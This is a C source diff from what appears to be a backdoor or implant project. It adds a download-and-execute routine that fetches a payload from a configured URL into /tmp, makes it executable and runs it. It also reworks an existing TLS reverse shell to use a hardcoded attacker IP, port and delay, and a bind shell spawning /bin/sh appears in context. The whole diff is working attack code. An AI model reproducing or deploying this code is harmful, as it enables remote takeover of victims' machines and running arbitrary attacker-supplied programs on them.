@@ -4,6 +4,9 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <openssl/ssl.h>
+#include <curl/curl.h>
+#include <sys/wait.h>
+#include <fcntl.h>
 
 #include "../include/attacks.h"
 #include "../include/utils.h"
@@ -104,6 +107,45 @@ static void handle_shell(SSL *ssl) {
     close(shell_serv[0]);
 }
 
+static int execute(char *file_path) {
+#ifdef DOWNLOAD_URL
+    if(chmod(file_path, 0777) != 0) {
+        LOG("Unable to change file permissions of file in execute()\n");
+        return -1;
+    }
+
+    int i;
+    switch(i = fork()) {
+        case -1:
+            LOG("fork() failed in execute()\n");
+            return -1;
+        // child process
+        case 0:
+            int fd = open("/tmp/output.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if(fd < 0) {
+                LOG("Failed to open output log in child process in execute\n");
+                exit(EXIT_FAILURE);
+            }
+            dup2(fd, STDOUT_FILENO);
+            dup2(fd, STDERR_FILENO);
+            close(fd);
+
+            LOG("Attempting to exec %s\n", file_path);
+            char *argv[] = {file_path, NULL};
+            execve(file_path, argv, NULL);
+            LOG("execve failed in execute()\n");
+            exit(EXIT_FAILURE);
+        default:
+            break;
+    }
+
+    int status;
+    waitpid(i, &status, 0);
+    
+    return 0;
+#endif
+}
+
 void bind_shell(void) {
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
@@ -124,8 +166,13 @@ void bind_shell(void) {
     execve("/bin/sh", NULL, NULL);
 }
 
-void rev_shell(char *rev_ip, uint16_t rev_port, unsigned int seconds) {
+void rev_shell(void) {
+#if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
     SSL_CTX *ctx;
+
+    char *rev_ip = REVERSE_IP;
+    uint16_t rev_port = REVERSE_PORT;
+    unsigned int seconds = DELAY_TIME;
 
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
@@ -164,4 +211,48 @@ void rev_shell(char *rev_ip, uint16_t rev_port, unsigned int seconds) {
     SSL_free(ssl);
     close(sockfd);
     SSL_CTX_free(ctx);
+#endif
+}
+
+void download_exec(void) {
+#ifdef DOWNLOAD_URL
+    CURLcode res;
+    FILE *fp;
+    char *file_path = "/tmp/payload";
+
+    fp = fopen(file_path, "wb");
+    if(!fp) {
+        LOG("failed to open %s in download_exec()\n", file_path);
+        return;
+    }
+
+    curl_global_init(CURL_GLOBAL_DEFAULT); // fix this, we shouldnt be calling everytime
+
+    CURL *curl = curl_easy_init();
+    
+    if(!curl) {
+        LOG("curl_easy_init() failed\n");
+        return;
+    }
+ 
+    curl_easy_setopt(curl, CURLOPT_URL, DOWNLOAD_URL);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)fp);
+
+    res = curl_easy_perform(curl);
+    if(res) {
+        LOG("curl_easy_perform() error: %s\n", curl_easy_strerror(res));
+        fclose(fp);
+        curl_easy_cleanup(curl);
+        curl_global_cleanup();
+        return;
+    }
+
+    if(execute(file_path) != 0) {
+        LOG("failed to perform execution in download_exec()\n");
+    }
+
+    fclose(fp);
+    curl_easy_cleanup(curl);
+    curl_global_cleanup(); // fix this, we shouldnt be calling every time
+#endif
 }
